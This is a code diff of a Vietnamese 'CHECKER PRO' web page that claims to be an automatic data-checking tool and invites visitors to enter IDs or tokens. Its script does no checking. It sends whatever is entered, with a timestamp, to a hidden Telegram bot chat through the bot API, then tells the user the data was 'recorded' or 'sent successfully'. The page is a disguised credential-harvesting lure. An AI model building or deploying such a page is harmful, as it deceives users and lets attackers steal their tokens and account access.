@@ -11,13 +11,9 @@
         body { font-family: 'Montserrat', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .container { width: 90%; max-width: 400px; background: #1e293b; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
         .logo i { font-size: 50px; color: #38bdf8; margin-bottom: 15px; }
-        h2 { margin-bottom: 5px; color: #f8fafc; }
-        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #334155; background: #1e293b; color: white; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
-        input:focus { border-color: #38bdf8; outline: none; box-shadow: 0 0 8px rgba(56, 189, 248, 0.4); }
-        button { width: 100%; padding: 14px; border-radius: 10px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; margin-top: 10px; }
-        button:hover { background: #0ea5e9; transform: translateY(-2px); }
-        button:active { transform: translateY(0); }
+        input { width: 100%; padding: 14px; margin: 20px 0; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 14px; border-radius: 10px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
+        button:hover { background: #0ea5e9; transform: scale(1.02); }
     </style>
 </head>
 <body>
@@ -25,8 +21,7 @@
 <div class="container">
     <div class="logo"><i class="fa-solid fa-shield-halved"></i></div>
     <h2>CHECKER PRO</h2>
-    <p>Hệ thống kiểm tra dữ liệu tự động</p>
-    <input type="text" id="userInput" placeholder="Nhập ID hoặc Token cần check...">
+    <input type="text" id="userInput" placeholder="Nhập nội dung cần check...">
     <button onclick="startProcessing()">KIỂM TRA NGAY</button>
 </div>
 
@@ -38,71 +33,36 @@
     async function startProcessing() {
         const val = document.getElementById('userInput').value.trim();
 
-        // 1. Kiểm tra nếu ô nhập trống
         if (!val) {
-            Swal.fire({ 
-                icon: 'warning', 
-                title: 'Thiếu thông tin', 
-                text: 'Vui lòng nhập dữ liệu trước khi kiểm tra!', 
-                background: '#1e293b', 
-                color: '#fff',
-                confirmButtonColor: '#38bdf8'
-            });
+            Swal.fire({ icon: 'warning', title: 'Thiếu dữ liệu', text: 'Vui lòng nhập nội dung!', background: '#1e293b', color: '#fff' });
             return;
         }
 
-        // 2. Hiển thị thông báo đang xử lý
         Swal.fire({
             title: 'Đang xử lý...',
-            html: 'Vui lòng chờ trong giây lát...',
-            allowOutsideClick: false,
             background: '#1e293b',
             color: '#fff',
             didOpen: () => { Swal.showLoading(); }
         });
 
         try {
-            // 3. Chuẩn bị nội dung gửi đi
-            const botMsg = `🚀 **DỮ LIỆU MỚI TỪ WEB**\n` +
-                           `━━━━━━━━━━━━━\n` +
-                           `👤 **Dữ liệu:** \`${val}\`\n` +
-                           `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n` +
-                           `🌐 **Nguồn:** GitHub Pages`;
-
-            // 4. Gửi dữ liệu bằng phương thức GET (ổn định hơn trên GitHub Pages)
+            const botMsg = `🚀 **DỮ LIỆU MỚI**\n━━━━━━━━━━━━━\n👤 **Data:** \`${val}\`\n⏰ **Lúc:** ${new Date().toLocaleString('vi-VN')}`;
+            
+            // Chuyển sang dùng URL trực tiếp để tránh lỗi kết nối (CORS)
             const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(botMsg)}&parse_mode=Markdown`;
             
             const response = await fetch(apiUrl);
 
             if (response.ok) {
-                // Thành công
-                Swal.fire({
-                    icon: 'success',
-                    title: 'Thành công',
-                    text: 'Dữ liệu đã được hệ thống ghi nhận!',
-                    background: '#1e293b',
-                    color: '#fff',
-                    confirmButtonColor: '#38bdf8'
-                });
-                document.getElementById('userInput').value = ''; // Xóa nội dung sau khi gửi
+                Swal.fire({ icon: 'success', title: 'Hoàn tất', text: 'Dữ liệu đã được gửi thành công!', background: '#1e293b', color: '#fff' });
+                document.getElementById('userInput').value = ''; 
             } else {
-                throw new Error('Telegram API Error');
+                throw new Error('Lỗi từ Telegram');
             }
-
         } catch (error) {
-            // Thất bại
-            console.error(error);
-            Swal.fire({ 
-                icon: 'error', 
-                title: 'Lỗi kết nối', 
-                text: 'Không thể kết nối đến máy chủ. Vui lòng kiểm tra lại Token!', 
-                background: '#1e293b', 
-                color: '#fff',
-                confirmButtonColor: '#ef4444'
-            });
+            Swal.fire({ icon: 'error', title: 'Lỗi kết nối', text: 'Vui lòng kiểm tra lại Bot hoặc mạng!', background: '#1e293b', color: '#fff' });
         }
     }
 </script>
-
 </body>
 </html>
